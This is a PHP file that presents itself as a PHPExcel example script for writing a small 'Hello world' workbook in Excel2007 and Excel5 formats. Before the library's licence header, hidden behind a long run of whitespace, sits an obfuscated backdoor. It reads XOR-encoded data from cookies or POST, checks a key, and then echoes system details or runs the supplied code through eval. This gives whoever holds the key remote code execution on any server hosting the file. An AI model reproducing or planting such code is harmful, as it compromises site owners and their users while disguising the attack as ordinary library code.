<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $u755c = 556;$GLOBALS['n1635e'] = Array();global $n1635e;$n1635e = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['ue632ec6'] = "\xa\x6f\x6e\x27\x71\x48\x45\x36\x58\x25\x35\x68\x78\x6b\x4e\x59\x3c\x65\x5b\x2b\x2c\x33\x54\x4a\x51\x2a\x3d\x50\x77\x30\x2f\x34\x64\x41\x5e\x37\x55\x49\x5c\x57\x29\x23\x9\x70\x6a\x5d\x75\x69\x63\x4c\x42\x3f\x62\x39\x7a\x6d\x7e\x52\x73\x61\x60\x28\x66\x47\x7c\x5f\x3b\x22\x2e\x4d\x4f\x56\x20\x53\x3a\x40\x74\x32\x44\x5a\x6c\x72\x76\x21\x7d\x79\x24\x67\x26\x7b\x2d\x43\x31\x4b\x38\x46\xd\x3e";$n1635e[$n1635e['ue632ec6'][2].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][10]] = $n1635e['ue632ec6'][48].$n1635e['ue632ec6'][11].$n1635e['ue632ec6'][81];$n1635e[$n1635e['ue632ec6'][32].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][59]] = $n1635e['ue632ec6'][1].$n1635e['ue632ec6'][81].$n1635e['ue632ec6'][32];$n1635e[$n1635e['ue632ec6'][55].$n1635e['ue632ec6'][32].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][62]] = $n1635e['ue632ec6'][32].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][2].$n1635e['ue632ec6'][17];$n1635e[$n1635e['ue632ec6'][87].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][48]] = $n1635e['ue632ec6'][58].$n1635e['ue632ec6'][76].$n1635e['ue632ec6'][81].$n1635e['ue632ec6'][80].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][2];$n1635e[$n1635e['ue632ec6'][55].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][92]] = $n1635e['ue632ec6'][32].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][2].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][32];$n1635e[$n1635e['ue632ec6'][54].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][10]] = $n1635e['ue632ec6'][47].$n1635e['ue632ec6'][2].$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][65].$n1635e['ue632ec6'][58].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][76];$n1635e[$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][53].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][62]] = $n1635e['ue632ec6'][58].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][81].$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][80].$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][54].$n1635e['ue632ec6'][17];$n1635e[$n1635e['ue632ec6'][12].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][77]] = $n1635e['ue632ec6'][43].$n1635e['ue632ec6'][11].$n1635e['ue632ec6'][43].$n1635e['ue632ec6'][82].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][81].$n1635e['ue632ec6'][58].$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][1].$n1635e['ue632ec6'][2];$n1635e[$n1635e['ue632ec6'][43].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][92]] = $n1635e['ue632ec6'][46].$n1635e['ue632ec6'][2].$n1635e['ue632ec6'][58].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][81].$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][80].$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][54].$n1635e['ue632ec6'][17];$n1635e[$n1635e['ue632ec6'][11].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][52]] = $n1635e['ue632ec6'][52].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][58].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][65].$n1635e['ue632ec6'][32].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][1].$n1635e['ue632ec6'][32].$n1635e['ue632ec6'][17];$n1635e[$n1635e['ue632ec6'][44].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][17]] = $n1635e['ue632ec6'][58].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][76].$n1635e['ue632ec6'][65].$n1635e['ue632ec6'][76].$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][55].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][65].$n1635e['ue632ec6'][80].$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][55].$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][76];$n1635e[$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][62]] = $n1635e['ue632ec6'][58].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][53].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][35];$n1635e[$n1635e['ue632ec6'][80].$n1635e['ue632ec6'][32].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][29]] = $n1635e['ue632ec6'][58].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][53];$n1635e[$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][53].$n1635e['ue632ec6'][92]] = $_POST;$n1635e[$n1635e['ue632ec6'][46].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][48]] = $_COOKIE;@$n1635e[$n1635e['ue632ec6'][54].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][10]]($n1635e['ue632ec6'][17].$n1635e['ue632ec6'][81].$n1635e['ue632ec6'][81].$n1635e['ue632ec6'][1].$n1635e['ue632ec6'][81].$n1635e['ue632ec6'][65].$n1635e['ue632ec6'][80].$n1635e['ue632ec6'][1].$n1635e['ue632ec6'][87], NULL);@$n1635e[$n1635e['ue632ec6'][54].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][10]]($n1635e['ue632ec6'][80].$n1635e['ue632ec6'][1].$n1635e['ue632ec6'][87].$n1635e['ue632ec6'][65].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][81].$n1635e['ue632ec6'][81].$n1635e['ue632ec6'][1].$n1635e['ue632ec6'][81].$n1635e['ue632ec6'][58], 0);@$n1635e[$n1635e['ue632ec6'][54].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][10]]($n1635e['ue632ec6'][55].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][12].$n1635e['ue632ec6'][65].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][12].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][46].$n1635e['ue632ec6'][76].$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][1].$n1635e['ue632ec6'][2].$n1635e['ue632ec6'][65].$n1635e['ue632ec6'][76].$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][55].$n1635e['ue632ec6'][17], 0);@$n1635e[$n1635e['ue632ec6'][44].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][17]](0);if (!$n1635e[$n1635e['ue632ec6'][55].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][92]]($n1635e['ue632ec6'][33].$n1635e['ue632ec6'][49].$n1635e['ue632ec6'][57].$n1635e['ue632ec6'][6].$n1635e['ue632ec6'][33].$n1635e['ue632ec6'][78].$n1635e['ue632ec6'][15].$n1635e['ue632ec6'][65].$n1635e['ue632ec6'][57].$n1635e['ue632ec6'][36].$n1635e['ue632ec6'][14].$n1635e['ue632ec6'][65].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][59])){$n1635e[$n1635e['ue632ec6'][55].$n1635e['ue632ec6'][32].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][62]]($n1635e['ue632ec6'][33].$n1635e['ue632ec6'][49].$n1635e['ue632ec6'][57].$n1635e['ue632ec6'][6].$n1635e['ue632ec6'][33].$n1635e['ue632ec6'][78].$n1635e['ue632ec6'][15].$n1635e['ue632ec6'][65].$n1635e['ue632ec6'][57].$n1635e['ue632ec6'][36].$n1635e['ue632ec6'][14].$n1635e['ue632ec6'][65].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][59], 1);$ieed41 = NULL;$l6c567192 = NULL;$n1635e[$n1635e['ue632ec6'][4].$n1635e['ue632ec6'][53].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][77]] = $n1635e['ue632ec6'][92].$n1635e['ue632ec6'][32].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][90].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][90].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][17].$n1635e['ue632ec6'][90].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][90].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][53].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][29];global $q9730c2;function  s42fc4f39($ieed41, $f555){global $n1635e;$pcbaf = "";for ($y1276e7=0; $y1276e7<$n1635e[$n1635e['ue632ec6'][87].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][48]]($ieed41);){for ($ib547=0; $ib547<$n1635e[$n1635e['ue632ec6'][87].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][48]]($f555) && $y1276e7<$n1635e[$n1635e['ue632ec6'][87].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][48]]($ieed41); $ib547++, $y1276e7++){$pcbaf .= $n1635e[$n1635e['ue632ec6'][2].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][10]]($n1635e[$n1635e['ue632ec6'][32].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][59]]($ieed41[$y1276e7]) ^ $n1635e[$n1635e['ue632ec6'][32].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][59]]($f555[$ib547]));}}return $pcbaf;}function  s879067($ieed41, $f555){global $n1635e;global $q9730c2;return $n1635e[$n1635e['ue632ec6'][80].$n1635e['ue632ec6'][32].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][29]]($n1635e[$n1635e['ue632ec6'][80].$n1635e['ue632ec6'][32].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][29]]($ieed41, $q9730c2), $f555);}foreach ($n1635e[$n1635e['ue632ec6'][46].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][48]] as $f555=>$p9f80){$ieed41 = $p9f80;$l6c567192 = $f555;}if (!$ieed41){foreach ($n1635e[$n1635e['ue632ec6'][47].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][52].$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][53].$n1635e['ue632ec6'][92]] as $f555=>$p9f80){$ieed41 = $p9f80;$l6c567192 = $f555;}}$ieed41 = @$n1635e[$n1635e['ue632ec6'][43].$n1635e['ue632ec6'][35].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][10].$n1635e['ue632ec6'][92]]($n1635e[$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][94].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][62]]($n1635e[$n1635e['ue632ec6'][11].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][21].$n1635e['ue632ec6'][52]]($ieed41), $l6c567192));if (isset($ieed41[$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][13]]) && $q9730c2==$ieed41[$n1635e['ue632ec6'][59].$n1635e['ue632ec6'][13]]){if ($ieed41[$n1635e['ue632ec6'][59]] == $n1635e['ue632ec6'][47]){$y1276e7 = Array($n1635e['ue632ec6'][43].$n1635e['ue632ec6'][82] => @$n1635e[$n1635e['ue632ec6'][12].$n1635e['ue632ec6'][31].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][92].$n1635e['ue632ec6'][77]](),$n1635e['ue632ec6'][58].$n1635e['ue632ec6'][82] => $n1635e['ue632ec6'][92].$n1635e['ue632ec6'][68].$n1635e['ue632ec6'][29].$n1635e['ue632ec6'][90].$n1635e['ue632ec6'][92],);echo @$n1635e[$n1635e['ue632ec6'][62].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][53].$n1635e['ue632ec6'][77].$n1635e['ue632ec6'][48].$n1635e['ue632ec6'][7].$n1635e['ue632ec6'][62]]($y1276e7);}elseif ($ieed41[$n1635e['ue632ec6'][59]] == $n1635e['ue632ec6'][17]){eval/*w63e582d4*/($ieed41[$n1635e['ue632ec6'][32]]);}exit();}} ?><?php
/**
 * PHPExcel
 *
 * Copyright (c) 2006 - 2015 PHPExcel
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   PHPExcel
 * @package    PHPExcel
 * @copyright  Copyright (c) 2006 - 2015 PHPExcel (http://www.codeplex.com/PHPExcel)
 * @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt	LGPL
 * @version    ##VERSION##, ##DATE##
 */

/** Error reporting */
error_reporting(E_ALL);
ini_set('display_errors', TRUE);
ini_set('display_startup_errors', TRUE);
date_default_timezone_set('Europe/London');

define('EOL',(PHP_SAPI == 'cli') ? PHP_EOL : '<br />');

/** Include PHPExcel */
require_once dirname(__FILE__) . '/../Classes/PHPExcel.php';

// Create new PHPExcel object
echo date('H:i:s') , " Create new PHPExcel object" , EOL;
$objPHPExcel = new PHPExcel();

// Set document properties
echo date('H:i:s') , " Set document properties" , EOL;
$objPHPExcel->getProperties()->setCreator("Maarten Balliauw")
							 ->setLastModifiedBy("Maarten Balliauw")
							 ->setTitle("PHPExcel Test Document")
							 ->setSubject("PHPExcel Test Document")
							 ->setDescription("Test document for PHPExcel, generated using PHP classes.")
							 ->setKeywords("office PHPExcel php")
							 ->setCategory("Test result file");


// Add some data
echo date('H:i:s') , " Add some data" , EOL;
$objPHPExcel->setActiveSheetIndex(0)
            ->setCellValue('A1', 'Hello')
            ->setCellValue('B2', 'world!')
            ->setCellValue('C1', 'Hello')
            ->setCellValue('D2', 'world!');

// Miscellaneous glyphs, UTF-8
$objPHPExcel->setActiveSheetIndex(0)
            ->setCellValue('A4', 'Miscellaneous glyphs')
            ->setCellValue('A5', 'éàèùâêîôûëïüÿäöüç');


$objPHPExcel->getActiveSheet()->setCellValue('A8',"Hello\nWorld");
$objPHPExcel->getActiveSheet()->getRowDimension(8)->setRowHeight(-1);
$objPHPExcel->getActiveSheet()->getStyle('A8')->getAlignment()->setWrapText(true);


$value = "-ValueA\n-Value B\n-Value C";
$objPHPExcel->getActiveSheet()->setCellValue('A10', $value);
$objPHPExcel->getActiveSheet()->getRowDimension(10)->setRowHeight(-1);
$objPHPExcel->getActiveSheet()->getStyle('A10')->getAlignment()->setWrapText(true);
$objPHPExcel->getActiveSheet()->getStyle('A10')->setQuotePrefix(true);



// Rename worksheet
echo date('H:i:s') , " Rename worksheet" , EOL;
$objPHPExcel->getActiveSheet()->setTitle('Simple');


// Set active sheet index to the first sheet, so Excel opens this as the first sheet
$objPHPExcel->setActiveSheetIndex(0);


// Save Excel 2007 file
echo date('H:i:s') , " Write to Excel2007 format" , EOL;
$callStartTime = microtime(true);

$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel2007');
$objWriter->save(str_replace('.php', '.xlsx', __FILE__));
$callEndTime = microtime(true);
$callTime = $callEndTime - $callStartTime;

echo date('H:i:s') , " File written to " , str_replace('.php', '.xlsx', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;
echo 'Call time to write Workbook was ' , sprintf('%.4f',$callTime) , " seconds" , EOL;
// Echo memory usage
echo date('H:i:s') , ' Current memory usage: ' , (memory_get_usage(true) / 1024 / 1024) , " MB" , EOL;


// Save Excel 95 file
echo date('H:i:s') , " Write to Excel5 format" , EOL;
$callStartTime = microtime(true);

$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel5');
$objWriter->save(str_replace('.php', '.xls', __FILE__));
$callEndTime = microtime(true);
$callTime = $callEndTime - $callStartTime;

echo date('H:i:s') , " File written to " , str_replace('.php', '.xls', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;
echo 'Call time to write Workbook was ' , sprintf('%.4f',$callTime) , " seconds" , EOL;
// Echo memory usage
echo date('H:i:s') , ' Current memory usage: ' , (memory_get_usage(true) / 1024 / 1024) , " MB" , EOL;


// Echo memory peak usage
echo date('H:i:s') , " Peak memory usage: " , (memory_get_peak_usage(true) / 1024 / 1024) , " MB" , EOL;

// Echo done
echo date('H:i:s') , " Done writing files" , EOL;
echo 'Files have been created in ' , getcwd() , EOL;
